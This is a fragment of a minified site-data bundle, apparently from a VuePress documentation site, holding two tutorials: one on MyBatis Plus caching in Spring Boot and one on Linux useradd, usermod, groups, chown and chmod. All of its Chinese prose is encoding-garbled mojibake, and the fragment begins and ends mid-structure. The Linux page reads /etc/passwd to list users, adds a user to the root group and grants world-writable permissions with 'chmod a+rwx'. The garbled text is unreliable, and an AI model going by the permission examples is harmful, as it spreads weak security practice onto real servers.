}\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n\n\nå¶å®ä¸é¢é¥¶äºä¸åä¸æ¥ï¼æç»æä½çæ¯ mappedstatement ç»´æ¤ç cache å¯¹è±¡ï¼ mappedstatement æ¯è¢«å¨å± configuration å¨ç¼å­çï¼æä»¥æ¥è¯¢ç»æä¸ä¼æ¸é¤ mappedstatement å¯¹è±¡åç¼å­ä¿¡æ¯ï¼åªæå½è§¦å updateï¼commitï¼rollback ç­æä¼æ¸é¤ mappedstatement éç»´æ¤çç¼å­ä¿¡æ¯',charsets:{cjk:!0}},{title:"MyBatis Plus+Spring Boot å®ç°ä¸äºçº§ç¼å­ä»¥åèªå®ä¹ç¼å­",frontmatter:{title:"MyBatis Plus+Spring Boot å®ç°ä¸äºçº§ç¼å­ä»¥åèªå®ä¹ç¼å­",date:"2023-06-25T09:22:36.000Z",permalink:"/mybatis/mybatis/303/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/30.Mybatis/31.mybatis/303.MyBatis%20Plus+Spring%20Boot%20%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E4%BB%A5%E5%8F%8A%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BC%93%E5%AD%98.html",relativePath:"00.java/30.Mybatis/31.mybatis/303.MyBatis Plus+Spring Boot å®ç°ä¸äºçº§ç¼å­ä»¥åèªå®ä¹ç¼å­.md",key:"v-74f21a38",path:"/mybatis/mybatis/303/",headers:[{level:2,title:"ä¸çº§ç¼å­",slug:"ä¸çº§ç¼å­",normalizedTitle:"ä¸çº§ç¼å­",charIndex:2},{level:2,title:"äºçº§ç¼å­",slug:"äºçº§ç¼å­",normalizedTitle:"äºçº§ç¼å­",charIndex:667},{level:2,title:"èªå®ä¹ç¼å­",slug:"èªå®ä¹ç¼å­",normalizedTitle:"èªå®ä¹ç¼å­",charIndex:1802}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"ä¸çº§ç¼å­ äºçº§ç¼å­ èªå®ä¹ç¼å­",content:'# ä¸çº§ç¼å­\n\né¦åéè¦å¨ application.yml ä¸­è¿è¡éç½®\n\nmybatis-plus:\n  # æå®å·ä½xmlè·¯å¾ å¨è·¯å¾\n  mapper-locations: classpath*:/com/fengqianrun/mybatisplus/**/*Mapper.xml\n  # è®¾ç½®å®ä½è·¯å¾ä½ç½®\n  type-aliases-package: com.fengqianrun.mybatisplus.bean\n  configuration:\n    # å¼å¯ä¸çº§ç¼å­,é»è®¤æ¯å¼å¯ç\n    local-cache-scope: SESSION\n  GlobalConfig:\n    # å³é­ banner ææ\n    banner: false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nå¶æ¬¡å¨æ¥è¯¢æ¹æ³ä¸ä½¿ç¨æ³¨è§£ @Transactionalï¼@Transactional ä»£è¡¨å°±åä¸ä¸ª sessionï¼æä»¬å¨è¿éé¢éå¤æ§è¡æ¥è¯¢ï¼å°±åªä¼æ¥è¯¢ä¸æ¬¡\n\n@Transactional\n@GetMapping("/testOne")\npublic UserBean testOne(){\n    UserBean userBean = cacheOneMapper.testOne();\n    userBean = null;\n    userBean = cacheOneMapper.testOne();\n    return userBean;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# äºçº§ç¼å­\n\né¦åï¼å¨ application.yml éç½®æä»¶ä¸­æ·»å å¦ä¸éç½®ï¼\n\nmybatis-plus:\n  configuration:\n    # å¼å¯äºçº§ç¼å­\n    cache-enabled: true\n\n\n1\n2\n3\n4\n\n\nå¿é¡»å®ç°è¦ç»å¯¹è±¡è¿è¡ Serializableï¼ä¾å¦ï¼\n\n@Data\n@TableName("user")\npublic class UserBean implements Serializable {\n    // ...\n}\n\n\n1\n2\n3\n4\n5\n\n\næåï¼éè¦å¨ Mapper æ¥å£ä¸­ä½¿ç¨ @CacheNamespace ï¼ä½¿ç¨è¯¥æ³¨è§£å¯ä»¥æ¹ä¾¿å°ä¸ºæ¯ä¸ª Mapper æ¥å£å®ä¹ç¬ç«çç¼å­ç©ºé´ï¼å¹¶æå®ä¸åçç¼å­å®ç°åç¼å­ç­ç¥ï¼ä»èæ´å¥½å°æ§å¶ç¼å­ææã\n\n@Mapper\n@CacheNamespace(eviction = FifoCache.class)\npublic interface CacheTwoMapper extends BaseMapper<UserBean> {\n    List<UserBean> testAll();\n    UserBean testOne();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\nä½å¦æ Mapper æ¥å£æå¯¹åºç XMLï¼åéè¦å¨ XML æè¿° cacheï¼ä½¿ç¨æ³¨è§£ @CacheNamespace å°±ä¼å¤±æï¼ä¸¤ä¸ªä¸èµ·å­å¨å°±ä¼æ¥é\n\n<mapper namespace="com.fengqianrun.mybatisplus.cache2.CacheTwoMapper">\n    <cache eviction="fifo"/>\n    <select id="testAll" resultType="com.fengqianrun.mybatisplus.bean.UserBean">\n        select * from user\n    </select>\n    <select id="testOne" resultType="com.fengqianrun.mybatisplus.bean.UserBean">\n        select * from user where id = 1\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\näºçº§ç¼å­é»è®¤æåµä¸æ¯ä½¿ç¨ MyBatis èªå¸¦ç PerpetualCache å®ç°ï¼å¯ä»¥éè¿éç½®æä»¶ä¸­çå±æ§æ¥è®¾ç½®ç¼å­å®ç°ç±»åå¶ä»åæ°ãå¦å¤ï¼å¨ä½¿ç¨äºçº§ç¼å­æ¶ï¼\néè¦æ³¨æé¿åæ°æ®å¹¶åæ´æ°å¯¼è´èæ°æ®çé®é¢ï¼å¯ä»¥éè¿è®¾ç½®ç¼å­å·æ°æ¶é´ç­æ¹å¼æ¥è§£å³è¿ä¸ªé®é¢ã\n\n\n# èªå®ä¹ç¼å­\n\nå¦æä½ æ¯ä½åºç¨ç¨åºçè¯ï¼ä½¿ç¨ä»¥ä¸çéç½®æ¹å¼æ²¡æé®é¢ï¼ä½å¦æä½ æ¯åå¸å¼æå¾®æå¡ï¼é£ä¹å°±ä¼é ææ°æ®ä¸ä¸è´çé®é¢ï¼æ­¤æ¶æä»¬éè¦åå©å¶ä»ç¼å­ï¼æ¯å¦ Redis æ¥ç¼å­æä»¬çæ¥è¯¢æ°æ®ãèªå®ä¹ç¼å­ä¹åªæ¯å¨äºçº§ç¼å­åºç¡ä¸çæ¹é ï¼æä»¥è§ååäºçº§ç¼å­ä¸æ ·ã\n\nå®ç° org.apache.ibatis.cache.Cache ç±»\n\npublic class MyCache implements Cache {\n\n    /**\n     * id ä¼æ¯ mapper æ¥å£çåç§°\n     */\n    private final String id;\n\n    /**\n     * å¯ä»¥æ¿æ¢ä¸º Redis\n     */\n    private Map<Object, Object> cache = new ConcurrentHashMap<Object, Object>();\n\n    public MyCache(String id) {\n        this.id = id;\n    }\n\n    /**\n     * ç¼å­å¯ä¸æ è¯\n     * @return\n     */\n    @Override\n    public String getId() {\n        return id;\n    }\n\n    /**\n     * å°é®å¼å¯¹æ¾å¥ç¼å­ä¸­\n     * @param key\n     * @param value\n     */\n    @Override\n    public void putObject(Object key, Object value) {\n        System.out.println("æ·»å -èªå®ä¹ç¼å­: "+key+"  "+value);\n        cache.put(key, value);\n    }\n\n    /**\n     * ä»ç¼å­ä¸­è·åæå®é®çå¼\n     * @param key\n     */\n    @Override\n    public Object getObject(Object key) {\n        System.out.println("æ¥è¯¢-èªå®ä¹ç¼å­: "+key);\n        return cache.get(key);\n    }\n\n    /**\n     * ä»ç¼å­ä¸­ç§»é¤æå®é®çå¼\n     * @param key\n     */\n    @Override\n    public Object removeObject(Object key) {\n        return cache.remove(key);\n    }\n\n    /**\n     * æ¸ç©ºç¼å­\n     */\n    @Override\n    public void clear() {\n        cache.clear();\n    }\n\n    /**\n     * è·åç¼å­ä¸­é®å¼å¯¹çæ°é\n     * @return\n     */\n    @Override\n    public int getSize() {\n        return cache.size();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n\n\nå·ä½ç mapper\n\n@Mapper\n@CacheNamespace(implementation = MyCache.class,eviction = FifoCache.class)\npublic interface CacheThreeMapper extends BaseMapper<UserBean> {\n\n    @Select("select * from user")\n    List<UserBean> testAll();\n\n    @Select("select * from user where id = 1")\n    UserBean testOne();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n> æä»¬è¿å¯ä»¥å¨ mapper æ¥å£ä¸å  @CacheNamespaceRef æ³¨è§£ï¼å½æä»¬å¨ä¸ä¸ª Mapper æ¥å£ä¸­éè¦ä½¿ç¨å¶ä» Mapper æ¥å£æå®ä¹çç¼å­æ¶ï¼å¯ä»¥éè¿ @CacheNamespaceRef æ³¨è§£æ¥å®ç°ãè¯¥æ³¨è§£ç¨äºæå®å¦ä¸ä¸ª Mapper æ¥å£ç Class å¯¹è±¡ï¼è¡¨ç¤ºå½å Mapper æ¥å£éè¦å¼ç¨è¯¥æ¥å£æå®ä¹çç¼å­å½åç©ºé´ã@CacheNamespaceRef (XXXXXMapper.class)',normalizedContent:'# ä¸çº§ç¼å­\n\né¦åéè¦å¨ application.yml ä¸­è¿è¡éç½®\n\nmybatis-plus:\n  # æå®å·ä½xmlè·¯å¾ å¨è·¯å¾\n  mapper-locations: classpath*:/com/fengqianrun/mybatisplus/**/*mapper.xml\n  # è®¾ç½®å®ä½è·¯å¾ä½ç½®\n  type-aliases-package: com.fengqianrun.mybatisplus.bean\n  configuration:\n    # å¼å¯ä¸çº§ç¼å­,é»è®¤æ¯å¼å¯ç\n    local-cache-scope: session\n  globalconfig:\n    # å³é­ banner ææ\n    banner: false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nå¶æ¬¡å¨æ¥è¯¢æ¹æ³ä¸ä½¿ç¨æ³¨è§£ @transactionalï¼@transactional ä»£è¡¨å°±åä¸ä¸ª sessionï¼æä»¬å¨è¿éé¢éå¤æ§è¡æ¥è¯¢ï¼å°±åªä¼æ¥è¯¢ä¸æ¬¡\n\n@transactional\n@getmapping("/testone")\npublic userbean testone(){\n    userbean userbean = cacheonemapper.testone();\n    userbean = null;\n    userbean = cacheonemapper.testone();\n    return userbean;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# äºçº§ç¼å­\n\né¦åï¼å¨ application.yml éç½®æä»¶ä¸­æ·»å å¦ä¸éç½®ï¼\n\nmybatis-plus:\n  configuration:\n    # å¼å¯äºçº§ç¼å­\n    cache-enabled: true\n\n\n1\n2\n3\n4\n\n\nå¿é¡»å®ç°è¦ç»å¯¹è±¡è¿è¡ serializableï¼ä¾å¦ï¼\n\n@data\n@tablename("user")\npublic class userbean implements serializable {\n    // ...\n}\n\n\n1\n2\n3\n4\n5\n\n\næåï¼éè¦å¨ mapper æ¥å£ä¸­ä½¿ç¨ @cachenamespace ï¼ä½¿ç¨è¯¥æ³¨è§£å¯ä»¥æ¹ä¾¿å°ä¸ºæ¯ä¸ª mapper æ¥å£å®ä¹ç¬ç«çç¼å­ç©ºé´ï¼å¹¶æå®ä¸åçç¼å­å®ç°åç¼å­ç­ç¥ï¼ä»èæ´å¥½å°æ§å¶ç¼å­ææã\n\n@mapper\n@cachenamespace(eviction = fifocache.class)\npublic interface cachetwomapper extends basemapper<userbean> {\n    list<userbean> testall();\n    userbean testone();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\nä½å¦æ mapper æ¥å£æå¯¹åºç xmlï¼åéè¦å¨ xml æè¿° cacheï¼ä½¿ç¨æ³¨è§£ @cachenamespace å°±ä¼å¤±æï¼ä¸¤ä¸ªä¸èµ·å­å¨å°±ä¼æ¥é\n\n<mapper namespace="com.fengqianrun.mybatisplus.cache2.cachetwomapper">\n    <cache eviction="fifo"/>\n    <select id="testall" resulttype="com.fengqianrun.mybatisplus.bean.userbean">\n        select * from user\n    </select>\n    <select id="testone" resulttype="com.fengqianrun.mybatisplus.bean.userbean">\n        select * from user where id = 1\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\näºçº§ç¼å­é»è®¤æåµä¸æ¯ä½¿ç¨ mybatis èªå¸¦ç perpetualcache å®ç°ï¼å¯ä»¥éè¿éç½®æä»¶ä¸­çå±æ§æ¥è®¾ç½®ç¼å­å®ç°ç±»åå¶ä»åæ°ãå¦å¤ï¼å¨ä½¿ç¨äºçº§ç¼å­æ¶ï¼\néè¦æ³¨æé¿åæ°æ®å¹¶åæ´æ°å¯¼è´èæ°æ®çé®é¢ï¼å¯ä»¥éè¿è®¾ç½®ç¼å­å·æ°æ¶é´ç­æ¹å¼æ¥è§£å³è¿ä¸ªé®é¢ã\n\n\n# èªå®ä¹ç¼å­\n\nå¦æä½ æ¯ä½åºç¨ç¨åºçè¯ï¼ä½¿ç¨ä»¥ä¸çéç½®æ¹å¼æ²¡æé®é¢ï¼ä½å¦æä½ æ¯åå¸å¼æå¾®æå¡ï¼é£ä¹å°±ä¼é ææ°æ®ä¸ä¸è´çé®é¢ï¼æ­¤æ¶æä»¬éè¦åå©å¶ä»ç¼å­ï¼æ¯å¦ redis æ¥ç¼å­æä»¬çæ¥è¯¢æ°æ®ãèªå®ä¹ç¼å­ä¹åªæ¯å¨äºçº§ç¼å­åºç¡ä¸çæ¹é ï¼æä»¥è§ååäºçº§ç¼å­ä¸æ ·ã\n\nå®ç° org.apache.ibatis.cache.cache ç±»\n\npublic class mycache implements cache {\n\n    /**\n     * id ä¼æ¯ mapper æ¥å£çåç§°\n     */\n    private final string id;\n\n    /**\n     * å¯ä»¥æ¿æ¢ä¸º redis\n     */\n    private map<object, object> cache = new concurrenthashmap<object, object>();\n\n    public mycache(string id) {\n        this.id = id;\n    }\n\n    /**\n     * ç¼å­å¯ä¸æ è¯\n     * @return\n     */\n    @override\n    public string getid() {\n        return id;\n    }\n\n    /**\n     * å°é®å¼å¯¹æ¾å¥ç¼å­ä¸­\n     * @param key\n     * @param value\n     */\n    @override\n    public void putobject(object key, object value) {\n        system.out.println("æ·»å -èªå®ä¹ç¼å­: "+key+"  "+value);\n        cache.put(key, value);\n    }\n\n    /**\n     * ä»ç¼å­ä¸­è·åæå®é®çå¼\n     * @param key\n     */\n    @override\n    public object getobject(object key) {\n        system.out.println("æ¥è¯¢-èªå®ä¹ç¼å­: "+key);\n        return cache.get(key);\n    }\n\n    /**\n     * ä»ç¼å­ä¸­ç§»é¤æå®é®çå¼\n     * @param key\n     */\n    @override\n    public object removeobject(object key) {\n        return cache.remove(key);\n    }\n\n    /**\n     * æ¸ç©ºç¼å­\n     */\n    @override\n    public void clear() {\n        cache.clear();\n    }\n\n    /**\n     * è·åç¼å­ä¸­é®å¼å¯¹çæ°é\n     * @return\n     */\n    @override\n    public int getsize() {\n        return cache.size();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n\n\nå·ä½ç mapper\n\n@mapper\n@cachenamespace(implementation = mycache.class,eviction = fifocache.class)\npublic interface cachethreemapper extends basemapper<userbean> {\n\n    @select("select * from user")\n    list<userbean> testall();\n\n    @select("select * from user where id = 1")\n    userbean testone();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n> æä»¬è¿å¯ä»¥å¨ mapper æ¥å£ä¸å  @cachenamespaceref æ³¨è§£ï¼å½æä»¬å¨ä¸ä¸ª mapper æ¥å£ä¸­éè¦ä½¿ç¨å¶ä» mapper æ¥å£æå®ä¹çç¼å­æ¶ï¼å¯ä»¥éè¿ @cachenamespaceref æ³¨è§£æ¥å®ç°ãè¯¥æ³¨è§£ç¨äºæå®å¦ä¸ä¸ª mapper æ¥å£ç class å¯¹è±¡ï¼è¡¨ç¤ºå½å mapper æ¥å£éè¦å¼ç¨è¯¥æ¥å£æå®ä¹çç¼å­å½åç©ºé´ã@cachenamespaceref (xxxxxmapper.class)',charsets:{cjk:!0}},{title:"linux åå»ºç¨æ·åæéæä½",frontmatter:{title:"linux åå»ºç¨æ·åæéæä½",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2300",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/2300.linux/2300.Linux%20%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E5%8F%8A%E6%9D%83%E9%99%90%E6%93%8D%E4%BD%9C.html",relativePath:"01.è¿ç»´/2300.linux/2300.Linux åå»ºç¨æ·åæéæä½.md",key:"v-9d02e050",path:"/linux/2300/",headers:[{level:2,title:"ç¨æ·",slug:"ç¨æ·",normalizedTitle:"ç¨æ·",charIndex:2},{level:3,title:"usermod",slug:"usermod",normalizedTitle:"usermod",charIndex:512},{level:2,title:"ç¨æ·ç» group",slug:"ç¨æ·ç»-group",normalizedTitle:"ç¨æ·ç» group",charIndex:1095},{level:2,title:"æä»¶æé chown",slug:"æä»¶æé-chown",normalizedTitle:"æä»¶æé chown",charIndex:1635},{level:2,title:"chmod",slug:"chmod",normalizedTitle:"chmod",charIndex:2059}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"ç¨æ· usermod ç¨æ·ç» group æä»¶æé chown chmod",content:'# ç¨æ·\n\nå³äº useradd çæäºåæ°ï¼\n\n * -u UIDï¼æå® UIDï¼è¿ä¸ª UID å¿é¡»æ¯å¤§äºç­äº 500ï¼å¹¶æ²¡æå¶ä»ç¨æ·å ç¨ç UID\n * -g GID/GROUPNAMEï¼æå®é»è®¤ç»ï¼å¯ä»¥æ¯ GID æè GROUPNAMEï¼åæ ·ä¹å¿é¡»çå®å­å¨\n * -G GROUPSï¼æå®éå ç»\n * -c COMMENTï¼æå®ç¨æ·çæ³¨éä¿¡æ¯\n * -d PATHï¼æå®ç¨æ·çå®¶ç®å½\n\n> -g åºæ¬ç»ï¼å¦ææ²¡ææå®ç¨æ·ç»ï¼åå»ºç¨æ·çæ¶åç³»ç»ä¼é»è®¤åæ¶åå»ºä¸ä¸ªåè¿ä¸ªç¨æ·åååçç»ï¼è¿ä¸ªç»å°±æ¯åºæ¬ç»ï¼ä¸å¯ä»¥æç¨æ·ä»åºæ¬ç»ä¸­å é¤ãå¨åå»ºæä»¶æ¶ï¼æä»¶çæå±ç»å°±æ¯ç¨æ·çåºæ¬ç»ã\n> -G éå ç»ï¼é¤äºåºæ¬ç»ä¹å¤ï¼ç¨æ·æå¨çå¶ä»ç»ï¼é½æ¯éå ç»ãç¨æ·æ¯å¯ä»¥ä»éå ç»ä¸­è¢«å é¤çã\n> ç¨æ·ä¸è®ºä¸ºä¸åºæ¬ç»ä¸­è¿æ¯éå ç»ä¸­ï¼å°±ä¼æ¥æè¯¥ç»çæéãä¸ä¸ªç¨æ·å¯ä»¥å±äºå¤ä¸ªéå ç»ãä½æ¯ä¸ä¸ªç¨æ·åªè½æä¸ä¸ªåºæ¬ç»ã\n\næ¥çææç¨æ·\n\ncat /etc/passwd\n\n\n1\n\n\næ·»å \n\nuseradd xulei -d /home/users/xulei\n\n\n1\n\n\nå é¤ç¨æ·åå³èçç®å½\n\nuserdel -r xulei\n\n\n1\n\n\n\n# usermod\n\nusermod å½ä»¤ç¨äºä¿®æ¹ç¨æ·å¸å·ã\n\n * -c <å¤æ³¨> ãä¿®æ¹ç¨æ·å¸å·çå¤æ³¨æå­ã\n * -d ç»å¥ç®å½ > ãä¿®æ¹ç¨æ·ç»å¥æ¶çç®å½ã\n * -e <æææé> ãä¿®æ¹å¸å·çæææéã\n * -f <ç¼å²å¤©æ°> ãä¿®æ¹å¨å¯ç è¿æåå¤å°å¤©å³å³é­è¯¥å¸å·ã\n * -g <ä¸»ç»> ãä¿®æ¹ç¨æ·æå±ä¸»ç»ã\n * -G <ç¾¤ç»> ãä¿®æ¹ç¨æ·æå±çéå ç¾¤ç»ã\n * -l <å¸å·åç§°> ãä¿®æ¹ç¨æ·å¸å·åç§°ã\n * -L éå®ç¨æ·å¯ç ï¼ä½¿å¯ç æ æã\n * -s ä¿®æ¹ç¨æ·ç»å¥åæä½¿ç¨ç shellã\n * -u ä¿®æ¹ç¨æ· IDã\n * -U è§£é¤å¯ç éå®ã\n * -a ä»£è¡¨ appendï¼ä¹å°±æ¯å°ç¨æ·æ·»å å°æ°ç¨æ·ç»ä¸­èä¸å¿ç¦»å¼åæçå¶ä»ç¨æ·ç»\n\nå° xulei æ·»å å° root ç»\n\nusermod -g root xulei\n\n\n1\n\n\nå¦ææ·»å çç¨æ·ä¸è½éè¿ ssh ç»å½ï¼å¯ä»¥æ¥çç¨æ·åå¦æ bash æé\n\n# æ¥çææç¨æ·ï¼å¯ä»¥æ¥çç¨æ·æ¯å¦æå¦ä¸è·¯å¾\ncat /etc/passwd\n# ä¿®æ¹ç¨æ·æ /bin/bash æé\nusermod -s /bin/bash ç¨æ·å\n# ç¦æ­¢ç¨æ·æ /bin/bash æ¹ä¸º /sbin/nologin\nusermod -s /sbin/nologin ç¨æ·å\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# ç¨æ·ç» group\n\nå³äºç»çå¢å åå é¤ä¿¡æ¯ä¼å¨ etc ç®å½ç group æä»¶ä¸­æ¾å°ï¼å½ä»¤ cat /etc/group å¯ä»¥çå°èªå·±çåç»ååç» idï¼0 è¡¨ç¤ºç®¡çåï¼rootï¼ï¼1 - 500 è¡¨ç¤ºç³»ç»ç¨æ·ã\n\ngroupadd å½ä»¤ è¯­æ³æ ¼å¼å¦ä¸ï¼\n\n * -gï¼æå®æ°å»ºå·¥ä½ç»ç idï¼\n * -rï¼åå»ºç³»ç»å·¥ä½ç»ï¼ç³»ç»å·¥ä½ç»çç» ID å°äº 500ï¼\n * -Kï¼è¦çéç½®æä»¶ "/ect/login.defs"ï¼\n * -oï¼åè®¸æ·»å ç» ID å·ä¸å¯ä¸çå·¥ä½ç»ã\n * -f,--force: å¦ææå®çç»å·²ç»å­å¨ï¼æ­¤éé¡¹å°å¤±æäºä»ä»¥æåç¶æéåºãå½ä¸ -g ä¸èµ·ä½¿ç¨ï¼å¹¶ä¸æå®ç GID_MIN å·²ç»å­å¨æ¶ï¼éæ©å¦ä¸ä¸ªå¯ä¸ç GIDï¼å³ - g å³é­ï¼ã\n\næ¥çææç»\n\ncat /etc/group\n\n\n1\n\n\næ¥çå½åç»\n\n[xulei@node102 sh]$ groups \nxulei\n\n\n1\n2\n\n\næ¥çç¨æ·æå±ç»\n\n[xulei@node102 sh]$ groups root\nroot : root\n\n\n1\n2\n\n\nå é¤ç»\n\ngroupdel xulei\n\n\n1\n\n\næ·»å é¢å¤ç»\n\nusermod -a -G ç»åç§° ç¨æ·å\n\n\n1\n\n\n\n# æä»¶æé chown\n\nç¨æ¥æ´æ¹æä¸ªç®å½ææä»¶çç¨æ·ååç¨æ·ç»ã\n\n * user : æ°çæ¡£æ¡æ¥æèçä½¿ç¨è ID\n * group : æ°çæ¡£æ¡æ¥æèçä½¿ç¨èç¾¤ä½ (group)\n * -c : è¥è¯¥æ¡£æ¡æ¥æèç¡®å®å·²ç»æ´æ¹ï¼ææ¾ç¤ºå¶æ´æ¹å¨ä½\n * -f : è¥è¯¥æ¡£æ¡æ¥æèæ æ³è¢«æ´æ¹ä¹ä¸è¦æ¾ç¤ºéè¯¯è®¯æ¯\n * -h : åªå¯¹äºè¿ç» (link) è¿è¡åæ´ï¼èéè¯¥ link çæ­£æåçæ¡£æ¡\n * -v : æ¾ç¤ºæ¥æèåæ´çè¯¦ç»èµæ\n * -R : å¯¹ç®åç®å½ä¸çæææ¡£æ¡ä¸å­ç®å½è¿è¡ç¸åçæ¥æèåæ´ (å³ä»¥éåçæ¹å¼éä¸ªåæ´)\n * --help : æ¾ç¤ºè¾å©è¯´æ\n * --version : æ¾ç¤ºçæ¬\n\nä¿®æ¹ abc æä»¶çææè\n\nchownÂ root abc\n\n\n1\n\n\næç®å½ /demo åå¶ä¸çæææä»¶åå­ç®å½çææäººæ¹æ rootï¼æå±ç»æ¹æ rootaã\n\nchown -R root:roota /demo\n\n\n1\n\n\n\n# chmod\n\n-rwxr--r--. 1 xulei root  98 Sep  7 11:49 arp.sh\n\n\n1\n\n\n-rwxr--r-- ä¸å± 10 ä¸ªå­ç¬¦ï¼ä¸é¢è®²è§£ä¸ï¼\n\n * d è¡¨ç¤ºç®å½ï¼å¦ææ¯ - è¡¨ç¤ºæ¯ä¸ä¸ªæ®éæä»¶ãå©ä½ç 9 ä¸ªå­ç¬¦ï¼åæ 3 ç»ï¼æ¯ç» 3 ä¸ªå­ç¬¦ï¼åå«è¡¨ç¤º user/group/others ç rwx æéï¼\n * u user è¡¨ç¤ºæ¥æèï¼å¯ä»¥çå°æ¥æèæ¯ xulei ç¨æ·ï¼ä½æä»¶è¿å±äº root ç»ï¼å æ­¤ xulei è¿æ¯æ æ³æ§è¡è¯¥æä»¶ã\n * g group è¡¨ç¤ºç»ï¼é¤äº mysql è¿ä¸ªäººç åä¸ä¸ª MySQL ç»æ¥æçæå\n * o others å°±æ¯å¶ä»äººäºï¼å¥æéä¹æ²¡æã\n * a è¡¨ç¤º âææ (all) ç¨æ·âãå®æ¯ç³»ç»é»è®¤å¼ã\n\n[root@node102 sh]# chmod a+rwx checkLogin.sh \n[root@node102 sh]# ll\ntotal 16\n-rwxr--r--. 1 xulei root  98 Sep  7 11:49 arp.sh\n-rwxrwxrwx. 1 xulei root 353 Jan 19 17:31 checkLogin.sh\n-rwxr--r--. 1 root  root 123 Sep  7 10:39 nginx_check.sh\n-rwxr-xr-x. 1 root  root 595 Nov 27 15:15 start.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n',normalizedContent:'# ç¨æ·\n\nå³äº useradd çæäºåæ°ï¼\n\n * -u uidï¼æå® uidï¼è¿ä¸ª uid å¿é¡»æ¯å¤§äºç­äº 500ï¼å¹¶æ²¡æå¶ä»ç¨æ·å ç¨ç uid\n * -g gid/groupnameï¼æå®é»è®¤ç»ï¼å¯ä»¥æ¯ gid æè groupnameï¼åæ ·ä¹å¿é¡»çå®å­å¨\n * -g groupsï¼æå®éå ç»\n * -c commentï¼æå®ç¨æ·çæ³¨éä¿¡æ¯\n * -d pathï¼æå®ç¨æ·çå®¶ç®å½\n\n> -g åºæ¬ç»ï¼å¦ææ²¡ææå®ç¨æ·ç»ï¼åå»ºç¨æ·çæ¶åç³»ç»ä¼é»è®¤åæ¶åå»ºä¸ä¸ªåè¿ä¸ªç¨æ·åååçç»ï¼è¿ä¸ªç»å°±æ¯åºæ¬ç»ï¼ä¸å¯ä»¥æç¨æ·ä»åºæ¬ç»ä¸­å é¤ãå¨åå»ºæä»¶æ¶ï¼æä»¶çæå±ç»å°±æ¯ç¨æ·çåºæ¬ç»ã\n> -g éå ç»ï¼é¤äºåºæ¬ç»ä¹å¤ï¼ç¨æ·æå¨çå¶ä»ç»ï¼é½æ¯éå ç»ãç¨æ·æ¯å¯ä»¥ä»éå ç»ä¸­è¢«å é¤çã\n> ç¨æ·ä¸è®ºä¸ºä¸åºæ¬ç»ä¸­è¿æ¯éå ç»ä¸­ï¼å°±ä¼æ¥æè¯¥ç»çæéãä¸ä¸ªç¨æ·å¯ä»¥å±äºå¤ä¸ªéå ç»ãä½æ¯ä¸ä¸ªç¨æ·åªè½æä¸ä¸ªåºæ¬ç»ã\n\næ¥çææç¨æ·\n\ncat /etc/passwd\n\n\n1\n\n\næ·»å \n\nuseradd xulei -d /home/users/xulei\n\n\n1\n\n\nå é¤ç¨æ·åå³èçç®å½\n\nuserdel -r xulei\n\n\n1\n\n\n\n# usermod\n\nusermod å½ä»¤ç¨äºä¿®æ¹ç¨æ·å¸å·ã\n\n * -c <å¤æ³¨> ãä¿®æ¹ç¨æ·å¸å·çå¤æ³¨æå­ã\n * -d ç»å¥ç®å½ > ãä¿®æ¹ç¨æ·ç»å¥æ¶çç®å½ã\n * -e <æææé> ãä¿®æ¹å¸å·çæææéã\n * -f <ç¼å²å¤©æ°> ãä¿®æ¹å¨å¯ç è¿æåå¤å°å¤©å³å³é­è¯¥å¸å·ã\n * -g <ä¸»ç»> ãä¿®æ¹ç¨æ·æå±ä¸»ç»ã\n * -g <ç¾¤ç»> ãä¿®æ¹ç¨æ·æå±çéå ç¾¤ç»ã\n * -l <å¸å·åç§°> ãä¿®æ¹ç¨æ·å¸å·åç§°ã\n * -l éå®ç¨æ·å¯ç 